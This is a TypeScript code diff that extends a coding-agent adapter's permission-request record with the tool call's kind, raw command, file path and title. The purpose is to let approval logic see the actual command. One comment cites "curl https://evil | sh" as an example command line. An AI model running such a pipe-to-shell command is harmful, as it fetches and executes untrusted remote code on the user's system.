@@ -149,6 +149,14 @@ interface AcpPermissionRequest {
   toolCallId: string
   question: string
   options: Array<{ optionId: string; name: string; kind: string }>
+  /** ACP's own classification of the tool call (e.g. `exec_command`, `edit`, `delete`, `fetch`) — independent of the human-readable `question` text. */
+  toolCallKind?: string
+  /** The raw shell command, straight from `toolCall.rawInput.command`, when the tool call carries one directly (exec-kind calls) — not reparsed out of `question`. */
+  command?: string
+  /** The raw file path, straight from `toolCall.rawInput.path`/`file_path`, when the tool call carries one directly (edit/delete-kind calls). */
+  path?: string
+  /** The tool call's own short title — for an exec-kind call this is often the command line itself (e.g. "curl https://evil | sh"), used as a fallback when `rawInput` didn't carry a `command` field directly. */
+  title?: string
 }
 
 /** Negotiated protocol generation for one connection (one spawned process). */
@@ -1556,7 +1564,13 @@ export class AcpAgentAdapter implements CodingAgentAdapter {
 
   private handlePermissionRequest(session: AcpSession, request: JsonRpcRequest): void {
     const params = request.params as {
-      toolCall?: { rawInput?: { reason?: string }; content?: Array<{ content?: { text?: string } }>; title?: string; kind?: string; toolCallId?: string }
+      toolCall?: {
+        rawInput?: { reason?: string; command?: string; path?: string; file_path?: string }
+        content?: Array<{ content?: { text?: string } }>
+        title?: string
+        kind?: string
+        toolCallId?: string
+      }
       options?: Array<{ optionId: string; name: string; kind: string }>
     } | undefined
 
@@ -1577,7 +1591,16 @@ export class AcpAgentAdapter implements CodingAgentAdapter {
       return
     }
 
-    session.pendingApproval = { requestId: request.id, toolCallId: toolCall?.toolCallId || '', question, options: approvalOptions }
+    session.pendingApproval = {
+      requestId: request.id,
+      toolCallId: toolCall?.toolCallId || '',
+      question,
+      options: approvalOptions,
+      toolCallKind: toolCall?.kind,
+      command: toolCall?.rawInput?.command || undefined,
+      path: toolCall?.rawInput?.path || toolCall?.rawInput?.file_path || undefined,
+      title: toolCall?.title || undefined
+    }
     session.status = SessionStatusType.WAITING_APPROVAL
     console.log('[AcpAgentAdapter] Awaiting user approval...')
   }
